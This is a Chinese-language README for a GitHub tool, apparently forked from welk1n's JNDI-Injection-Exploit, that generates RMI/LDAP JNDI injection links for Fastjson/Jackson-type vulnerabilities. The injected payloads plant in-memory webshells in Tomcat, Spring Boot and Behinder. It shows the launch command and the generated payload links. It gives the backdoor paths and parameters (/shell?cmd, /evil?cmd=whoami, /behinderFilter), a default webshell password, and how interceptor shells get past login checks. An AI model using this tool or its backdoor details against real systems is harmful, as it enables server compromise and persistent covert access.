## 介绍

JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

最开始做项目的初衷是因为，遇到一些场景只能用RMI注入，无法使用LDAP注入，但是找了一段的时间之后发现Github中并没有很合心意的RMI注入工具，于是原本想自己做一个RMI注入内存马的工具，参考了一下welk1n佬的项目，结果发现佬写的精妙，可以改动的地方很少了已经，索性直接fork大佬的项目，添加工具。
原仓库地址：https://github.com/welk1n/JNDI-Injection-Exploit

冰蝎内存🐴默认密码:elysium

## 更新功能

### 内存马注入

直接运行jar包，可以看到添加了Tomcat Memshell、Behinder两种内存马（还在更新中）

```shell
$ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar          
[ADDRESS] >> 127.0.0.1
[COMMAND] >> open -a Calculator
----------------------------JNDI Links---------------------------- 
Target environment(Behinder Filter Memshell):
rmi://127.0.0.1:1099/0gzbmk
ldap://127.0.0.1:1389/0gzbmk
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/q7empz
ldap://127.0.0.1:1389/q7empz
Target environment(Tomcat Servlet Memshell):
rmi://127.0.0.1:1099/knesin
ldap://127.0.0.1:1389/knesin
Target environment(Behinder Servlet Memshell):
rmi://127.0.0.1:1099/gfco3c
ldap://127.0.0.1:1389/gfco3c
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://127.0.0.1:1099/emytl0
Target environment(Springboot Interceptor Memshell):
rmi://127.0.0.1:1099/jdky8b
ldap://127.0.0.1:1389/jdky8b
Target environment(Springboot Interceptor Behinder Memshell):
rmi://127.0.0.1:1099/4mpkre
ldap://127.0.0.1:1389/4mpkre
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://127.0.0.1:1099/3uzhzd
ldap://127.0.0.1:1389/3uzhzd
Target environment(Tomcat Filter Memshell):
rmi://127.0.0.1:1099/93hurt
ldap://127.0.0.1:1389/93hurt

----------------------------Server Log----------------------------
2023-08-29 13:00:30 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2023-08-29 13:00:30 [RMISERVER]  >> Listening on 0.0.0.0:1099
2023-08-29 13:00:31 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

- Tomcat Servlet Memshell

  - 命令执行Servlet内存马：路径/shell，参数cmd

    ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/1.jpg)

- Behinder Servlet Memshell

  - 冰蝎Servlet内存马：路径/shell，密码:elysium

    ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/2.jpg)

- Springboot interceptor Memshell
  - springboot的拦截器内存马，在request header中的command为入参执行命令

    ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/3.jpg)
	
- Springboot interceptor Behinder Memshell:
  
	- springboot拦截器冰蝎内存马，在request header中的shell参数中跟上Behinder，输入密码即可连接
	
	![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/4.jpg)

- Tomcat Filter Memshell:
  - Tomcat filter内存马，在访问路径/evil?cmd=whoami，可以执行命令
    ![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/5.jpg)

- Behinder Filter Memshell:
  - Behinder filter内存马，访问路径/behinderFilter,并在request header中的shell参数中跟上Behinder，输入密码即可连接
    ![ ](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/6.jpg)
    
## Tips:

Q:为什么有了Servlet/Controller内存马还是需要Interceptor内存马呢？

A:如果服务端存在拦截器，指定如果未登录的状态除了/login接口其他都不执行，访问就会跳转回/login接口的话。这个controller的内存马不就访问不到了吗？访问不到就形同虚设了。所以controller的内存马并不能作为一种通用的内存马进行注入，于是就需要注入interceptor内存马了。

## 待实现

- 添加~~filter~~、~~Interceptor~~类型的内存马。
- 融合groovy的bypass利用链到项目中。
- 更新weblogic以及其他中间件的内存马注入环境
- 增加注入哥斯拉内存马的模块
- 加入websocket内存马



## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=MUYU212/JNDI-Injection-Memshell&type=Date)](https://star-history.com/#MUYU212/JNDI-Injection-Memshell&Date)
